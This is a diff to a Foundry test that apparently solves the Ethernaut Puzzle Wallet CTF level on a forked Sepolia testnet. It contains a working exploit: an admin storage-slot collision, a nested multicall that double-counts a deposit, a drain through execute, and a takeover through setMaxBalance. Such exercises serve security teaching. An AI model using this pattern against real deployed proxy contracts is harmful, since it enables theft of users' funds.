@@ -2,23 +2,17 @@
 pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
-import {PuzzleProxy} from "../src/ethernaut/PuzzleProxy.sol";
-import {PuzzleWallet} from "../src/ethernaut/PuzzleWallet.sol";
+import {PuzzleProxy, PuzzleWallet} from "../src/ethernaut/PuzzleProxy.sol";
 
-contract PuzzleProxyTest is Test {
+contract PuzzleProxyAttackerTest is Test {
     address alice = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;
 
-    PuzzleProxy puzzleProxy =
-        PuzzleProxy(payable(0xD759B1762559E4042C722e11033Cf193e48ce923));
+    PuzzleProxy puzzleProxy = PuzzleProxy(payable(0xD759B1762559E4042C722e11033Cf193e48ce923));
 
-    PuzzleWallet puzzleWalletImp =
-        PuzzleWallet(0xfCA940B93F93BB99d01D255a6988c3d97cd79128);
+    PuzzleWallet puzzleWalletImp = PuzzleWallet(0xfCA940B93F93BB99d01D255a6988c3d97cd79128);
 
     function setUp() public {
-        uint256 forkId = vm.createFork(
-            vm.envString("SEPOLIA_RPC_URL"),
-            6347823
-        );
+        uint256 forkId = vm.createFork(vm.envString("SEPOLIA_RPC_URL"), 6347823);
         vm.selectFork(forkId);
     }
 
@@ -38,10 +32,7 @@ contract PuzzleProxyTest is Test {
         // addToWhitelist
         puzzleProxy.proposeNewAdmin(alice);
 
-        console.log(
-            "PuzzleWallet(address(puzzleProxy)).owner:",
-            PuzzleWallet(address(puzzleProxy)).owner()
-        );
+        console.log("PuzzleWallet(address(puzzleProxy)).owner:", PuzzleWallet(address(puzzleProxy)).owner());
         PuzzleWallet(address(puzzleProxy)).addToWhitelist(alice);
 
         console.log(
@@ -56,24 +47,12 @@ contract PuzzleProxyTest is Test {
         data2[0] = abi.encodeCall(PuzzleWallet.deposit, ());
         data[1] = abi.encodeCall(PuzzleWallet.multicall, (data2));
 
-        console.log(
-            "multicall before balances[alice]:",
-            PuzzleWallet(address(puzzleProxy)).balances(alice)
-        );
-        PuzzleWallet(address(puzzleProxy)).multicall{
-            value: address(puzzleProxy).balance
-        }(data);
+        console.log("multicall before balances[alice]:", PuzzleWallet(address(puzzleProxy)).balances(alice));
+        PuzzleWallet(address(puzzleProxy)).multicall{value: address(puzzleProxy).balance}(data);
 
-        console.log(
-            "multicall after balances[alice]:",
-            PuzzleWallet(address(puzzleProxy)).balances(alice)
-        );
+        console.log("multicall after balances[alice]:", PuzzleWallet(address(puzzleProxy)).balances(alice));
 
-        PuzzleWallet(address(puzzleProxy)).execute(
-            alice,
-            PuzzleWallet(address(puzzleProxy)).balances(alice),
-            "0x"
-        );
+        PuzzleWallet(address(puzzleProxy)).execute(alice, PuzzleWallet(address(puzzleProxy)).balances(alice), "0x");
 
         uint256 _maxBalance = uint256(uint160(alice));
         PuzzleWallet(address(puzzleProxy)).setMaxBalance(_maxBalance);
@@ -82,4 +61,4 @@ contract PuzzleProxyTest is Test {
     }
 }
 
-// forge test --match-contract PuzzleProxyTest -vvv
+// forge test --match-contract PuzzleProxyAttackerTest -vvv
